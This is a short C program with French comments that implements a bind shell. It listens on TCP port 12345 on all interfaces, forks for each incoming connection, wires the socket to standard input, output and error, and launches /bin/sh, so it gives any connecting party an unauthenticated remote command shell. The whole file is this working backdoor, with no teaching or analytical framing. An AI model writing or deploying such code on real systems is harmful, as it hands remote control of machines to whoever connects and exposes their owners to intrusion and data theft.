#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define PORT 12345  // Port d'écoute du serveur

int main(int argc, char* argv[]) {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);

    // Création de la socket serveur
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Erreur lors de la création de la socket");
        exit(1);
    }

    // Configuration de l'adresse du serveur
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;  // Écoute sur toutes les interfaces
    server_addr.sin_port = htons(PORT);

    // Liaison de la socket au port et adresse spécifiés
    if (bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur lors de la liaison de la socket");
        exit(2);
    }

    // Mise en écoute des connexions entrantes
    if (listen(server_sock, 5) < 0) {
        perror("Erreur lors de la mise en écoute");
        exit(3);
    }

    printf("Serveur en écoute sur le port %d...\n", PORT);

    while (1) {
        // Acceptation d'une connexion entrante
        client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &client_len);
        if (client_sock < 0) {
            perror("Erreur lors de l'acceptation de la connexion");
            continue;
        }

        printf("Connexion reçue d'un client...\n");

        // Création d'un processus fils pour gérer la connexion
        int pid = fork();

        if (pid < 0) {
            perror("Erreur lors de la création du processus fils");
            close(client_sock);
            continue;
        }

        if (pid == 0) {  // Processus fils
            close(server_sock);  // Le fils ferme la socket d'écoute

            // Redirection des entrées/sorties
            dup2(client_sock, STDIN_FILENO);
            dup2(client_sock, STDOUT_FILENO);
            dup2(client_sock, STDERR_FILENO);

            // Exécution de l'interpréteur de commandes
            execlp("/bin/sh", "/bin/sh", (char *)NULL);

            // En cas d'erreur avec execlp
            perror("Erreur lors de l'exécution du shell");
            exit(4);
        } else {  // Processus parent
            close(client_sock);  // Le parent ferme la socket client et continue à écouter
        }
    }

    return 0;
}
